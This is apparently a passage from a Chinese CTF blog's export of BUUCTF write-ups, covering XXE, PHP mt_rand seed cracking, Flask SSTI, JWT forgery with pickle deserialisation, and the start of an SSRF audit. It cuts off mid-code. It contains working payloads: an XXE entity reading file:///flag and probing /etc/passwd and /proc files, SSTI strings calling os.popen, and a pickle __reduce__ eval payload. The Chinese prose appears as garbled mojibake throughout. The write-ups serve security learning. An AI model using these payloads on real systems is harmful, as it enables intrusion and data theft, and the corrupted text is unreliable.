·æ‰§è¡Œä¸¤æ¬¡ç„¶åé€šè¿‡è·¯å¾„å»è®¿é—®å°±å¯ä»¥æ‹¿åˆ°flagäº†\n\nè¿™é‡Œç”¨çš„`bash -c` ä¹Ÿå°±æ˜¯å°†åé¢å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤è¯»å…¥æ‰§è¡Œ ç„¶åè¾“å‡º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657151543-97b24931-a4a4-45ad-9f6e-2dcc37ef39d4.png) ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657191148-69954b67-5aa4-4516-a440-2b628bb97fca.png)\n\næˆåŠŸï¼\n","tags":["ssrf","perl"],"categories":["buuctf"]},{"title":"buuctf-74-[NCTF2019]True XML cookbook.txt","url":"/post/e8a597ec.html","content":"\n[NCTF2019]True XML cookbook.txt\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™é“é¢˜è€ƒå¯Ÿäº†xmlå’Œxxeï¼Œå…¶å®æ”»å‡»æ‰‹æ®µæ‰‹æ®µæ˜¯xxeï¼Œä¸€å¼€å§‹åšè¿™é“é¢˜ä¸€ç›´æ²¡å¤ç°å‡ºæ¥ï¼Œbpçˆ†ç ´æ¨¡å—ä¸€ç›´ä¸åŠ¨ï¼Œä¹‹åç”¨äº†pythonè„šæœ¬ä¹Ÿä¸è¡Œï¼Œå°±æ”¾å¼ƒäº†ï¼Œç¬¬äºŒå¤©ä¸­åˆåœ¨è¯•äº†ä¸€æ¬¡ï¼Œç»ˆäºæˆåŠŸäº†ï¼ŒçœŸç„å­¦ã€‚åšä¹‹å‰ä¹Ÿæ˜¯å»è¡¥äº†ä¸€ä¸‹xxeçš„çŸ¥è¯†ï¼ŒçœŸä¸é”™ã€‚\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå‘ç°æˆ‘ä»¬çš„ç™»å½•åä¼šæ˜¾ç¤ºåœ¨ç•Œé¢ä¸Š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643576603-ba19db5b-007b-446c-82f3-10ac758b00cc.png)\n\nä¹‹å‰buuæœ‰é“é¢˜ä¹Ÿæ˜¯å’Œè¿™é“é¢˜ç›®ä¸€æ ·çš„uiï¼Œç›´æ¥å¥—ç”¨ä¸Šé“é¢˜ç›®çš„è§£é¢˜ç­”æ¡ˆï¼Œå‘ç°è‚¯å®šä¸è¡Œã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643711572-da9bff85-1876-406d-ad6d-69dddb2fd2f5.png)\n\né¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªpayloadæ„æˆ\n\nç¬¬ä¸€è¡Œ`<?xml version=\"1.0\"  encoding=\"UTF-8\" ?>`è¿™ä¸€è¡Œè¡¨ç¤ºäº†è¿™æ˜¯xmlçš„æ–‡æ¡£æ˜¾ç¤ºäº†ç‰ˆæœ¬ä¿¡æ¯å’Œç¼–ç æ ¼å¼\n\næœ€é‡è¦çš„ä¸€éƒ¨åˆ†ï¼š\n\n```\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n```\n\nè¿™æ˜¯DTDï¼Œç”¨æ¥è§„èŒƒxmlçš„æ–‡æ¡£æ ¼å¼ `username`ä¸ºæ ¹å…ƒç´  æ¯ä¸ªxmlæ–‡æ¡£éƒ½è¦æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼Œå¹¶ä¸”æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼Œç„¶å`aaa`æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä¸€ä¸ªå®ä½“ï¼Œå¹¶ä¸”è¿™é‡Œ`SYSTEM`è¡¨ç¤ºæ˜¯å¤–éƒ¨å®ä½“ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆxxeå«åšå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨å¤–éƒ¨å®ä½“æ¥è¾¾åˆ°æˆ‘ä»¬é¢„æœŸçš„ä¸€ä¸ªæ”»å‡»æ‰‹æ®µã€‚å…¶å®è¿™é‡ŒæŠŠä»–ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå˜é‡å°±å¯ä»¥ä¹‹åæ˜¯`aaa`è¿™ä¸ªå®ä½“çš„å€¼ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªfileåè®®ï¼Œæ²¡é”™xxeå¯ä»¥ä¸ä¼ªåè®®ä¸€èµ·æ­é…ä½¿ç”¨å»æ¶æ„è¯»ä¸€äº›æ–‡ä»¶å†…å®¹ã€‚  å…·ä½“å¯ä»¥çœ‹è¿™é‡Œï¼šhttps://xz.aliyun.com/t/3357#toc-0 æ€»ç»“çš„å¾ˆåˆ°ä½\n\nç„¶åé€šè¿‡ `&å®ä½“åç§°;` çš„æ–¹å¼æ¥è°ƒç”¨è¿™ä¸ªæˆ‘ä»¬åˆ›å»ºçš„å®ä½“ã€‚\n\nç„¶åä¹‹åå°±ä¸æ‡‚äº† ï¼Œæ…¢æ…¢çš„å»çœ‹å¤§ä½¬çš„wpå»å­¦ä¹ \n\nä¹‹åå¯ä»¥é€šè¿‡filterä¼ªåè®®å»è¯» index.phpçš„å†…å®¹ä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆç”¨\n\nç„¶åè¿™é“é¢˜çš„æ€è·¯æ˜¯é€šè¿‡xxeå»æ¢æµ‹å†…ç½‘ å‚è€ƒï¼šhttps://blog.spoock.com/2019/10/08/proc/\n\nhttps://www.cnblogs.com/secutity-zbk/p/14789043.html\n\n- /etc/hosts å‚¨å­˜åŸŸåè§£æçš„ç¼“å­˜\n- /etc/passwd ç”¨æˆ·å¯†ç \n- /proc/net/arp  åœ°å€è§£æçš„å†…æ ¸ARPè¡¨çš„ä¿¡æ¯  \n- /proc/net/fib_trie è·¯ç”±ç¼“å­˜\n\næ‰«ä¸€ä¸‹åŸŸåè§£æç¼“å­˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644669966-630764be-85ba-49fd-ae15-4972d217180d.png)\n\næ‰«ä¸€ä¸‹ç”¨æˆ·ç™»å½•çŠ¶æ€å¯†ç å•¥çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644749032-70eded58-fd1c-433f-b3f9-0df596e95e13.png)\n\nå‘ç°éƒ½å¯ä»¥æ‰«åˆ°\n\nå»æ‰«è§£æçš„åœ°å€å’Œè·¯ç”±ç¼“å­˜ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644874065-fa187595-bd78-4376-9b6c-5f4bbd6bf4b9.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644939819-489e3110-fb7b-4962-8207-21c8754032c0.png)\n\nå‘ç°å¯ç–‘ipï¼Œç›´æ¥è¿›è¡Œhttpåè®®è¯»ip\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679645074091-dea2c2c1-2834-4809-a4a1-dad93bbb8423.png)\n\nå‘ç°ä¸è¡Œï¼Œçœ‹äº†å¤§ä½¬çš„wpæ˜¯å› ä¸ºcæ®µipä¸æ­£ç¡®ï¼Œä¹Ÿå°±æ˜¯129è¿™é‡Œä¸å¯¹ï¼Œå¥½åƒæ˜¯è®¡ç®—æœºç½‘ç»œçš„çŸ¥è¯†ï¼Œè¿™é‡Œå°±ä¸æ·±ç©¶äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œç›´æ¥ç”¨bpçš„çˆ†ç ´æ¨¡å—å°±è¡Œï¼Œå°±æ˜¯è¿™é‡Œä¸€å¼€å§‹æ²¡åšå‡ºæ¥ï¼Œå¥½åƒæ˜¯é¢˜ç›®é—®é¢˜ï¼Œç¬¬äºŒå¤©ç»ˆäºåšå‡ºæ¥äº†\n\nå½“ç½‘æ®µæ­£ç¡®æ—¶ï¼Œæ‹¿åˆ°flagã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643489111-d7a23ddc-2bb6-46c7-b5d0-436cb2e227ee.png)\n","tags":["xxe","å†…ç½‘"],"categories":["buuctf"]},{"title":"buuctf-73-[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–","url":"/post/490aa04.html","content":"\n[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™é“é¢˜æ˜¯ä¸€é“å…³äºä¼ªé€ ä¼ªéšæœºæ•°çš„é¢˜ç›®ï¼Œä¹‹å‰ä»æœªæ¥è§¦è¿‡ï¼Œè¿™æ¬¡æ¥è®°å½•ä¸€ä¸‹\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®ä¹‹åæŸ¥çœ‹æºç  å‘ç°`check.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483023667-c996906b-3fbe-417a-baaa-47e01e22b92f.png)\n\nå‘ç°æºç ï¼š\n\n```plain\n<?php\n#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼\nheader(\"Content-Type: text/html;charset=utf-8\");\nsession_start();\nif(!isset($_SESSION['seed'])){\n$_SESSION['seed']=rand(0,999999999);\n}\n\nmt_srand($_SESSION['seed']);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\n$str_show = substr($str, 0, 10);\necho \"<p id='p1'>\".$str_show.\"</p>\";\n\n\nif(isset($_POST['num'])){\n    if($_POST['num']===$str){x\n        echo \"<p id=flag>æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}</p>\";\n    }\n    else{\n        echo \"<p id=flag>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§</p>\";\n    }\n}\nshow_source(\"check.php\");\n```\n\næ€»ä½“åˆ†æä¸€ä¸‹å°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥ä¸€ä¸ªnumå‚æ•° å½“numç­‰äºä»–äº§ç”Ÿçš„éšæœºé•¿ä¸º20çš„å­—ç¬¦ä¸² å°±èƒ½æ‹¿åˆ°flag\n\nmt_srand() \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483191710-fb814299-27a1-4fe9-8795-4f860a7848e9.png)\n\nç®€å•è¯´å°±æ˜¯è¿™ä¸ªå‡½æ•°ç»™mt_rand()å‡½æ•°æä¾›ä¸€ä¸ªç§å­ ç„¶åmt_rand()å‡½æ•°å»ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½†æ˜¯è¿™ä¸ªéšæœºæ•°å…¶å®æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°\n\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½ç ´è§£å‡ºè¿™ä¸ªç§å­ è¿™é“é¢˜ç›®å°±è¿åˆƒè€Œè§£äº†\n\nè¿™é‡Œè¦ç”¨åˆ°php_mt_seedè„šæœ¬å»ç ´è§£è¿™ä¸ªç§å­  è„šæœ¬ä¸‹è½½åœ°å€ï¼šhttps://www.openwall.com/php_mt_seed/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483395438-3f102fcd-eb70-4556-b7ce-21a5d383ad02.png)\n\nç„¶åè£…åˆ°æˆ‘çš„kaliä¸Š\n\nå…ˆmake ä¸€ä¸‹\n\nè¿™é‡Œmakeä¸€å¼€å§‹ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ç„¶åå»æŸ¥äº†æŸ¥è¿˜æ˜¯æœ‰ä¸œè¥¿çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483549317-739c5e85-a900-42c3-a7d6-c296871ac8be.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483489104-33b48267-83cc-452b-90ce-84b89fb3431a.png)\n\nç„¶åè¿™ä¸ªè„šæœ¬è¦å…ˆæŠŠè¿™å­—ç¬¦ä¸²è½¬åŒ–ä¸ºä¸€ä¸ªå¯è¯†åˆ«çš„æ•°åˆ—\n\npythonè„šæœ¬å¦‚ä¸‹:\n\n```plain\nstr1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nstr2='QJlBBqs6ji'\nstr3 = str1[::-1]\nlength = len(str2)\nres=''\nfor i in range(len(str2)):  \n    for j in range(len(str1)):\n        if str2[i] == str1[j]:\n            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n            break\nprint(res)\n```\n\nä½†æ˜¯æˆ‘æ²¡æœ‰ææ‡‚è¿™ä¸ªè„šæœ¬çš„ç›®çš„å’ŒåŸç†\n\nè¿›è¡Œçˆ†ç ´ å‘ç°ç§å­ è¿™é‡Œè°ƒç”¨è„šæœ¬é€šè¿‡`./`è°ƒç”¨å…¶å®å°±æ˜¯è¿è¡Œè¯¥è„šæœ¬çš„æ„æ€\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483685459-9dc379c9-56ce-4f7e-a035-954752ed1f4c.png)\n\nå†æ ¹æ®è¿™ä¸ªç§å­ é‡æ–°ç”Ÿæˆé¢˜ç›®ä¸­çš„å­—ç¬¦ä¸² ç›´æ¥ç”¨é¢˜ç›®çš„ä»£ç ç¨åŠ ä¿®æ”¹å°±è¡Œ\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```plain\n<?php\nmt_srand(672026733);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n?> \n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483730008-bc495859-079b-47ec-b4cb-835e4a636a22.png)\n\næ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483777454-45feaed2-b77a-4171-be81-e44f5bae654d.png)\n","tags":["ä¼ªéšæœºæ•°"],"categories":["buuctf"]},{"title":"buuctf-72-[CSCCTF 2019 Qual]FlaskLight","url":"/post/8df15d0e.html","content":"\n[CSCCTF 2019 Qual]FlaskLight\n\n<!--more-->\n\nä¸€çœ¼ä¸çœŸ flaskçš„ssti\n\nè¿™é“é¢˜å‡ ä¹æ²¡æ€ä¹ˆè¿‡æ»¤ payloadéšä¾¿åœ¨ç½‘ä¸Šæ‰’å°±è¡Œäº†\n\nä½†æ˜¯ä¸çŸ¥é“è¶…çº§æ— æ•Œè„šæœ¬æ€ä¹ˆä¼šæŠ¥é”™ åªèƒ½æ‰‹åŠ¨å»æ³¨å…¥äº†\n\nè®°å½•ä¸€ä¸‹å„ç§payloadçš„å§ è¿™é“é¢˜å¦‚æœç›´æ¥ç”¨`__globals__`ä¼šæŠ¥é”™å¯èƒ½æ˜¯è¢«å±è”½äº†ï¼Œé€šè¿‡æ‹¼æ¥ç»•è¿‡å°±è¡Œäº†\n\nè¿™äº›æ˜¯æ¯”è¾ƒç®€å•çš„payloadï¼š\n\n1. `?search={{config.__init__['__global'+'s__'].os.popen(\"cmd\").read()}}`\n2. `?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval'](\"__import__('os').popen('cmd').read()\")}}`\n","tags":["flaskæ¡†æ¶","python"],"categories":["buuctf"]},{"title":"buuctf-71-[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun","url":"/post/8a6d07e1.html","content":"\n[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nä¸€é“å…³äºjwtå’Œpythonååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå¯¹æˆ‘æ¥è¯´å¾ˆæ–°é¢–ï¼Œæš‚æ—¶åªä¼šphpçš„ååºåˆ—åŒ–ï¼Œå°±å½“ä½œå­¦ä¹ é¢˜ç›®äº†ï¼Œç„¶åè¶Šåšåˆ°åé¢çš„é¢˜ç›®å‘ç°ä¼špythonè„šæœ¬å¹²ä¸€äº›æœºæ¢°é‡å¤æ€§çš„äº‹æƒ…çœŸçš„å¾ˆæœ‰ç”¨ï¼Œå¾—æ‰¾æ—¶é—´å»å­¦ç€å†™è„šæœ¬ã€‚\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679473847087-0169d116-8a33-4976-bd55-f371017157d8.png)\n\nçœ‹è¿‡æºç ä¸€äº›æ­£å¸¸æ“ä½œä¹‹åä»€ä¹ˆä¹Ÿæ²¡å‘ç°ï¼Œçœ‹åˆ°ä¸€å¥è¯ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬ä¹°lv6ï¼Œåœ¨è¿™ä¹‹å‰å…ˆå»æ³¨å†Œç™»å½•ï¼Œç„¶åæ—¥å¸¸çœ‹ä¸€ä¸‹adminçš„ç”¨æˆ·ï¼Œå‘ç°æ˜¯å·²ç»æ³¨å†Œè¿‡çš„ã€‚\n\nä¸€å¼€å§‹æˆ‘éƒ½æ˜¯ä¸€é¡µä¸€é¡µçš„åœ¨æ‰¾ï¼Œå‘ç°æ‰¾äº†10å‡ é¡µéƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±æ„Ÿè§‰ä¸å¯¹åŠ²äº†ï¼Œç„¶åçœ‹äº†å¤§ä½¬çš„wpï¼Œå‘ç°è¦ç”¨è„šæœ¬å»æ‰¾ï¼Œæœ€åpage=181ï¼Œæˆ‘çœŸçš„äººéƒ½å‚»äº†\n\nè¿™é‡Œæ”¾ä¸‹å¤§ä½¬çš„è„šæœ¬\n\n```plain\nimport requests\n\nimport time\n\nfor i in range(1,200):\n\n    time.sleep(0.8)\n\n    print(i)\n\n    url = 'http://ca5b02fb-d09b-45b9-b0ff-a14785826592.node3.buuoj.cn/shop?page={}'.format(i)\n\n    r = requests.get(url)\n\n    if 'lv6.png' in r.text:\n\n        print(\"æ‰¾åˆ°lv6-----{}\".format(i))\n\n        break\n```\n\nå…¶å®è¿™ä¸ªè„šæœ¬è¿˜æ˜¯è›®å®¹æ˜“ç†è§£çš„ï¼Œå°†é¡µæ•°æ ¼å¼åŒ–ï¼Œè®©åä¸€ç›´å¾ªç¯ï¼Œå½“è¯¥é¡µé¢å­˜åœ¨`lv6.png`å†…å®¹æ—¶ï¼Œå°±è¯´æ˜æ‰¾åˆ°äº†\n\nä½†æ˜¯è¿™é‡Œè¦æ³¨æ„ï¼Œä¸€å®šè®©è„šæœ¬æš‚åœ0.8ç§’ï¼Œå› ä¸ºbuuä¼šé˜²çˆ¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474702762-160ddbe0-fb42-4be9-8366-724c99159d5b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474338539-15f8f312-2c1b-4634-a335-e851b7b615de.png)\n\næ‰¾åˆ°ä¹‹åå‘ç°è¿™ä¸ªé’±æ•°æˆ‘ä»¬ä¹°ä¸äº†ï¼ŒæŠ“åŒ…æŸ¥çœ‹ï¼Œå‘ç°æœ‰æŠ˜æ‰£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474379880-aa279a5f-7795-4149-898f-7a5b6e3e7554.png)\n\nç›´æ¥ä¿®æ”¹ä¸€ä¸‹ï¼Œå‘ç°é¡µé¢è·³è½¬äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474405099-6658c1fd-c0b6-4f9a-82df-b7676aa6ea26.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474429619-3a0c3aa1-a290-4dc3-a611-ae624ea29688.png)\n\nåªå®¹è®¸adminè®¿é—®ï¼Œè¿™ä¹Ÿåº”å°è¯äº†ä¹‹å‰æ³¨å†Œçš„æ—¶å€™adminå·²ç»è¢«æ³¨å†Œè¿‡\n\næŠ“åŒ…åˆ†æä¸€ä¸‹ï¼Œè¿™é‡Œå°±æ˜¯å…³äºjwtçš„çŸ¥è¯†ç‚¹äº†ï¼Œå‚è€ƒï¼šhttps://www.cnblogs.com/cjsblog/p/9277677.html\n\nå°±æˆ‘ä¸ªäººè®¤ä¸ºï¼Œç±»ä¼¼äºæˆ‘ä»¬å¹³å¸¸åšé¢˜çš„php sessionç”¨äºè®°å½•å½“å‰ç™»å½•ç”¨æˆ·ä¼šè¯ä¿¡æ¯\n\né‚£ä¹ˆå¼„æ˜ç™½ä¹‹åå°±è¯•ç€å»ä¼ªé€ è¿™ä¸ªjwtï¼ŒæŠŠæˆ‘ä»¬çš„jwtä¼ªé€ æˆadminçš„é‚£ä¹ˆä¸å°±å¯ä»¥æˆåŠŸå˜›\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474509525-bb77812e-6b29-47af-9b35-e4030eef9816.png)\n\nå…ˆå°†è¿™ä¸ªjwtå­—ç¬¦ä¸²ç»™ å¼„å›åŸæ¥çš„æ¨¡æ · è¿™é‡Œæœ‰ä¸ªå·¥å…·ï¼šhttps://jwt.io/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474884435-1df5d5ae-3d04-4797-973c-28d07ddacbbf.png)\n\nå‘ç°å­˜åœ¨æˆ‘ä»¬ç™»å½•åç§°ï¼Œç›´æ¥æ”¹ä¸ºadminï¼Œå†æŠ“åŒ…å¯ä»¥å˜›ï¼Œç†è®ºå¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªkeyï¼Œå¿…é¡»æ‹¿åˆ°è¿™ä¸ªkeyæ‰èƒ½å†åç¼–è¯‘å›å»ç¬¦åˆä»–çš„è¦æ±‚ï¼Œè¿™é‡Œå°±æœ‰ä¸ªæš´åŠ›ç ´è§£jwt keyçš„è„šæœ¬ https://github.com/brendan-rius/c-jwt-cracker\n\næˆ‘ç›´æ¥æ˜¯æ”¾åœ¨kaliç¯å¢ƒä¸‹äº†ï¼Œå› ä¸ºè¿˜è¦é…ç½®dockerç¯å¢ƒï¼Œç¯å¢ƒé…ç½®å¥½ä»¥åï¼Œé‡Œé¢æœ‰ä¸ªæ–‡ä»¶è¯´æ˜ï¼Œçœ‹çœ‹å°±ä¼šä½¿ç”¨ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475165344-5aead3f4-8bbd-47b7-97e8-5e6c22972de8.png)\n\næ³¨æ„è¦ç”¨rootèº«ä»½ çˆ†å‡º keyä¸º `1Kun` \n\nç°åœ¨å°†ç”¨æˆ·æ¢ä¸º `admin` keyä½¿ç”¨ `1Kun`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475274835-d6c1dca3-27df-4561-89ed-a8aec4f676ad.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475309325-035236f5-1a7f-49c8-a173-ad59fad9498c.png)\n\nç„¶åæŸ¥çœ‹æºç  å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475357662-942c80ce-c9b9-4d58-9db6-4f749ac6cfd4.png)\n\nä¸‹è½½ä¸‹æ¥ \n\nçœ‹äº†å¤§ä½¬çš„wp å‘ç°Admin.pyå­˜åœ¨ååºåˆ—åŒ–æ¼æ´\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475402464-72d76905-3a4f-4dee-ba61-e28208f05db6.png)\n\næºç é™„ä¸Šï¼š\n\n```plain\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n```\n\nè¿™é‡Œçš„pickleæ¨¡å—åº”è¯¥å°±æ˜¯å±äºpython çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¨¡å—\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475553228-e58261a6-ee61-458f-ab34-317dd22fdd73.png)\n\nçœ‹åˆ°becomeå­˜åœ¨ååºåˆ—åŒ– é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åƒphpååºåˆ—åŒ–æ¼æ´ä¸€æ · æ„é€ è¯»flagçš„åºåˆ—åŒ–å­—ç¬¦ä¸² ç„¶åä¼ ç»™becomeå°±å¯ä»¥è·å¾—flagäº†\n\næœ¬åœ°æ„é€ ï¼š\n\n```plain\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):  ##å½“pickleå¯¹è±¡è¢«è°ƒç”¨æ—¶è‡ªåŠ¨æ‰§è¡Œ\n       return (eval, (\"open('/flag.txt','r').read()\",)) ##æ³¨æ„è¦æ˜¯å…ƒç»„\n\na = pickle.dumps(payload())  ##å¦‚æœå¯¹pickleä¸ç†è§£å¯è‡ªè¡Œç™¾åº¦\na = urllib.quote(a)\nprint a\n```\n\nè¿™é‡Œæˆ‘åœ¨æœ¬æœºvscodeä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475702429-4efd6e74-e03d-49da-91a6-b059d717becd.png)\n\nå‘ç°è¿™ä¸ªè„šæœ¬æ˜¯å±äºpython2çš„ æˆ‘è¿™æ˜¯python3 æ‰€ä»¥æˆ‘åªå¥½å»æˆ‘çš„kaliè™šæ‹Ÿå»è·‘\n\næ³¨æ„è¿™é‡Œè¦æŠŠä¸­æ–‡æ³¨é‡Šåˆ äº† ä¸ç„¶ä¼šæŠ¥é”™ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475831556-3f608263-1166-4f39-a71b-dcece769b79d.png)\n\nç„¶åç‚¹å‡» ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜ æŠ“åŒ… ä¿®æ”¹becomeå€¼\n\næˆåŠŸæ‹¿åˆ° flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475923738-eada5091-7c68-4503-9402-50b706cc41c3.png)\n","tags":["python","jwt","pythonååºåˆ—åŒ–"],"categories":["buuctf"]},{"title":"buuctf-60-[De1CTF 2019]SSRF Me","url":"/post/2ee4794d.html","content":"\n[De1CTF 2019]SSRF Me\n\n<!--more-->\n\nä¸€é“pythonä»£ç å®¡è®¡ï¼Œå‘ç°å®¡è®¡èƒ½åŠ›çœŸçš„å¾ˆé‡è¦ã€‚\n\nçœ‹åˆ°æºç ï¼š\n\n```cmake\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    